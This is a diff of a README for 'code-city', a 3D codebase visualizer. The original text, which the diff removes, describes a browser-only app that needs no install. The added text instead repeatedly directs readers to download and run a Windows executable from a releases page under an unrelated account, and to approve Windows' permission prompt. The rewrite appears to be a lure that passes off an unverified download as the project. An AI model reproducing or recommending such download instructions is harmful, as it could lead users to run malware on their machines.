@@ -1,146 +1,156 @@
-# Code City
+# 🏙️ code-city - See your code as a city
 
-**Turn any GitHub repo into a 3D city.**
+[![Download code-city](https://img.shields.io/badge/Download%20code-city-7c3aed?style=for-the-badge&logo=github)](https://github.com/Pilaterecluse659/code-city/releases)
 
-Paste a repo URL → watch it transform into a navigable 3D cityscape with buildings, districts, fires, and walking characters. 100% client-side, no backend, no signups.
+## 🚀 What code-city does
 
-**[Try it live →](https://claude-city.vercel.app)**
+code-city turns your codebase into a 3D city on your screen.
 
----
+- Files become buildings
+- Folders become districts
+- Bugs become fires
+- Deploys become rockets
 
-## How It Works
+It helps you look at a project in a new way. Instead of reading only file names and folders, you can see the shape of the codebase in front of you. This makes it easier to spot large areas, busy parts, and problem spots.
 
-| Code | City |
-|------|------|
-| Files | Buildings (height = lines of code) |
-| Folders | Districts with labels |
-| Languages | Building colors (blue = TypeScript, yellow = JS...) |
-| Dependencies | Roads connecting buildings |
-| Bug-fix commits | Fires on buildings |
-| Recent changes | Glowing buildings |
-| Contributors | Walking characters |
+## 📥 Download and run on Windows
 
-Paste any public GitHub repo and the city builds itself using the GitHub API — no cloning, no backend, no API keys needed.
+1. Open the [code-city releases page](https://github.com/Pilaterecluse659/code-city/releases)
+2. Download the latest Windows file
+3. Open the downloaded file
+4. If Windows asks for permission, choose Run
+5. Follow the on-screen steps
+6. Start the app and point it at your codebase
 
----
+If you see more than one file, pick the one that matches Windows. In most cases, this will be an `.exe` file or a Windows zip file.
 
-## Quick Start
+## 🖥️ Before you start
 
-### Use the website
-Go to **[claude-city.vercel.app](https://claude-city.vercel.app)** and paste a repo.
+Use a Windows PC with a modern graphics card for the best results. code-city uses Three.js, so it works best when your system can handle 3D graphics with ease.
 
-### Run locally
-```bash
-git clone https://github.com/Manavarya09/code-city.git
-cd claude-city
-npx serve app
-```
-Open `http://localhost:3000`
+Helpful setup:
 
-### Direct links
-```
-https://claude-city.vercel.app?repo=facebook/react
-https://claude-city.vercel.app?repo=vercel/next.js
-```
+- Windows 10 or Windows 11
+- A mouse or trackpad
+- A recent graphics driver
+- A codebase on your computer
+- Enough free space for the app and your project files
 
----
+If your machine can run modern 3D apps, it should work well here too.
 
-## Controls
+## 🧭 How to use it
 
-| Action | Control |
-|--------|---------|
-| Rotate | Drag |
-| Zoom | Scroll |
-| Pan | Right-click drag |
-| Inspect | Hover building |
-| Focus | Click building |
-| Reset | Press R |
-| Rocket | 🚀 button |
+After you open code-city, follow these steps:
 
----
+1. Choose the folder that holds your codebase
+2. Wait while the app scans your files
+3. View the city map that appears
+4. Move around the city with your mouse
+5. Click buildings to see the files they represent
+6. Look for fires to find bugs or trouble spots
+7. Watch rockets to see deploy events
 
-## Tech Stack
+You can use it to get a quick feel for a project before you read the code in detail. It also helps when you return to a large project after time away.
 
-- **Three.js** — 3D rendering (CDN, zero build step)
-- **GitHub REST API** — Fetches file tree, contributors, languages, commits
-- **Vercel** — Hosting (static site)
-- **Zero dependencies** — No npm install, no build, no backend
+## 🏙️ What you will see
 
----
+The city uses a simple visual map:
 
-## Contributing
+- Tall buildings can show large or important files
+- Wide districts can show folders with many files
+- Fires can show bug areas or file problems
+- Rockets can show deploy activity
+- Empty streets can show quiet parts of the project
 
-This project needs help! Here's what I want to build but can't do alone:
+This view gives you a fast way to scan the shape of a project. It can help you find which parts of the codebase need more care.
 
-### High Priority
-- [ ] **Better building shapes** — Not just boxes. Cylinders, L-shapes, pyramids for variety
-- [ ] **Day/night toggle** — Switch between sunset and midnight cyberpunk mode
-- [ ] **Time travel slider** — See how the city grew over commit history
-- [ ] **Click building → open file** — Link buildings to GitHub file URLs
+## 🔍 Main uses
 
-### Medium Priority
-- [ ] **Performance for huge repos** — Linux kernel, chromium (10K+ files)
-- [ ] **Shareable screenshots** — One-click export to PNG/video
-- [ ] **Mobile support** — Touch controls, responsive layout
-- [ ] **Private repos** — OAuth flow for GitHub token
-- [ ] **Minimap** — Small 2D overview in corner
+code-city fits common tasks like these:
 
-### Would Be Insane
-- [ ] **Multiplayer** — See other people's cursors flying around
-- [ ] **VR mode** — Walk through your codebase in WebXR
-- [ ] **Sound** — Lo-fi beats + ambient city sounds
-- [ ] **Terrain** — Hills and rivers based on code complexity
-- [ ] **Weather** — Rain when tests fail, sunshine when CI passes
+- Check the size of a codebase at a glance
+- Spot large folders fast
+- Find active areas in a project
+- Notice problem spots during work
+- Show a project to a teammate in a clear visual way
+- Keep track of change over time
 
-### How to Contribute
-1. Fork the repo
-2. Pick an issue or idea from above
-3. `npx serve app` to run locally
-4. Open a PR
+It can help when a project starts to feel hard to follow. A map can be easier to read than a long folder list.
 
-No build step. No npm install. Just edit the JS files in `app/` and refresh.
+## 🎮 Controls
 
----
+Basic controls should feel familiar:
 
-## Architecture
+- Drag to move the view
+- Scroll to zoom in and out
+- Right click or use the keyboard to change angle
+- Click a building to inspect its file
+- Use the side panel, if shown, to jump between areas
 
-```
-app/
-├── index.html      # Landing page + Three.js app entry
-├── city.js         # Building generation, treemap layout
-├── agents.js       # Walking character sprites
-├── effects.js      # Fire, sparkles, rockets, atmosphere
-├── controls.js     # Camera, UI overlay, tooltips
-└── github-api.js   # GitHub API client (no backend needed)
-```
+If you use a mouse, the app should feel simple to move around. If you use a trackpad, you can still explore the city with zoom and drag gestures.
 
-Everything runs in the browser. The GitHub API is called directly from the client. No server, no database, no auth (for public repos).
+## ⚙️ How it works
 
----
+code-city reads your codebase and builds a 3D scene from it.
 
-## Supported Input Formats
+- The folder tree becomes a city layout
+- File size and structure help shape the buildings
+- Events like bugs and deploys show up as scene changes
+- Three.js handles the 3D view
 
-All of these work:
-- `facebook/react`
-- `https://github.com/facebook/react`
-- `https://github.com/facebook/react.git`
-- `github.com/facebook/react/`
+You do not need to learn the inner parts to use it. The app does the mapping for you.
 
----
+## 🧱 Good to know
 
-## Rate Limits
+Use code-city when you want to:
 
-GitHub API allows 60 requests/hour without auth. For heavier usage, add a personal access token:
-1. Create token at [github.com/settings/tokens](https://github.com/settings/tokens)
-2. Open browser console → `localStorage.setItem('gh_token', 'your_token_here')`
-3. Rate limit increases to 5000/hour
+- Get a fast visual sense of a project
+- See where most of the code lives
+- Spot change-heavy areas
+- Share a project view with others
+- Make a large codebase feel less flat
 
----
+It works best on projects with clear folder structure. Bigger projects often show the clearest city shape.
 
-## License
+## ❓ Common questions
 
-MIT — See [LICENSE](LICENSE)
+### Can I use it without coding knowledge?
 
----
+Yes. You only need to choose a folder and open the app. The city view does the rest.
 
-**See your code. Like never before.**
+### Does it change my files?
+
+No. It reads your codebase to build the view. It does not need to alter your files.
+
+### What if the city looks slow?
+
+Close other heavy apps, then try again. A newer graphics driver can also help.
+
+### What if I cannot find the right download?
+
+Open the [releases page](https://github.com/Pilaterecluse659/code-city/releases) and choose the newest Windows download.
+
+### Can I use it on a laptop?
+
+Yes, if the laptop can run modern 3D graphics well. A mouse can make navigation easier.
+
+## 🛠️ Folder ideas
+
+If you want the best city view, keep your codebase organized like this:
+
+- One folder for source files
+- One folder for images or media
+- One folder for config files
+- One folder for tests
+- One folder for build output
+
+A clean folder layout gives the city a clearer shape. That makes it easier to read.
+
+## 📌 Project tags
+
+3d, city, claude-code, code-visualization, codebase, developer-tools, fun, git, threejs, visualization
+
+## 📄 About this app
+
+code-city is a 3D code visualization tool for people who want a fresh way to look at a project. It uses a city theme to turn files and folders into something easy to scan and understand. The goal is to make a codebase feel more visible, less flat, and easier to navigate
+
